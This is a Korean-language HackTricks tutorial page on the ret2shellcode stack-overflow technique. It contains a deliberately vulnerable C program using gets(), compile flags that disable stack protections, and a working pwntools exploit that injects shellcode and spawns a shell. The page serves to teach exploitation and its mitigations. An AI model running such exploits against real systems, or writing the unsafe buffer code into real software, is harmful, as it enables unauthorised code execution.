# Ret2Shellcode

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)</strong>에서 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

다른 HackTricks 지원 방법:

- **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
- **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 기본 정보

**Ret2shellcode**는 이진 해킹에서 사용되는 기술로, 공격자가 취약한 프로그램의 스택에 쉘코드를 작성한 다음 **명령어 포인터 (IP)** 또는 **확장된 명령어 포인터 (EIP)**를 이 쉘코드의 위치를 가리키도록 수정하여 실행시키는 것입니다. 이는 무단 액세스를 얻거나 대상 시스템에서 임의의 명령을 실행하는 데 사용되는 고전적인 방법입니다. 여기에는 간단한 C 예제와 **pwntools**를 사용하여 해당 취약점을 이용하는 Python 스크립트를 작성하는 방법이 포함되어 있습니다.

### C 예제: 취약한 프로그램

간단한 취약한 C 프로그램 예제부터 시작해보겠습니다:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
이 프로그램은 `gets()` 함수 사용으로 버퍼 오버플로우 취약점이 있습니다.

### 컴파일

취약한 환경을 시뮬레이션하기 위해 다양한 보호 기능을 비활성화하면서 이 프로그램을 컴파일하려면 다음 명령을 사용할 수 있습니다:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: 스택 보호 기능을 비활성화합니다.
* `-z execstack`: 스택을 실행 가능하게 만들어줍니다. 이는 스택에 저장된 셸코드를 실행하는 데 필요합니다.
* `-no-pie`: 위치 독립 실행 파일을 비활성화하여 셸코드가 위치할 메모리 주소를 예측하기 쉽게 합니다.
* `-m32`: 프로그램을 32비트 실행 파일로 컴파일합니다. 종종 exploit 개발의 간편성을 위해 사용됩니다.

### Pwntools를 사용한 Python Exploit

다음은 **pwntools**를 사용하여 **ret2shellcode** 공격을 수행하는 Python exploit을 작성하는 방법입니다:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
이 스크립트는 **NOP 슬라이드**, **쉘코드**, 그리고 **EIP**를 NOP 슬라이드를 가리키는 주소로 덮어쓰면서 쉘코드가 실행되도록 페이로드를 구성합니다.

**NOP 슬라이드** (`asm('nop')`)는 실행이 정확한 주소에 관계없이 쉘코드로 "슬라이딩"될 가능성을 높이기 위해 사용됩니다. `p32()` 인수를 조정하여 NOP 슬라이드에 착지할 오프셋을 포함한 버퍼의 시작 주소로 설정하세요.

## 보호 기능

* [**ASLR**](../common-binary-protections/aslr.md)은 실행마다 신뢰할 수 있는 주소를 위해 **비활성화**되어야 합니다. 그렇지 않으면 함수가 저장될 주소가 항상 동일하지 않아서 이길 함수가 로드된 위치를 파악하기 위해 유출이 필요할 수 있습니다.
* [**스택 카나리**](../common-binary-protections/stack-canaries.md)도 비활성화되어야 합니다. 그렇지 않으면 침해된 EIP 반환 주소가 결코 따라가지 않을 수 있습니다.
* [**NX**](../common-binary-protections/no-exec-nx.md) **스택** 보호는 스택 내부의 쉘코드 실행을 방지할 것입니다. 왜냐하면 해당 영역은 실행할 수 없기 때문입니다.

## 다른 예시

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
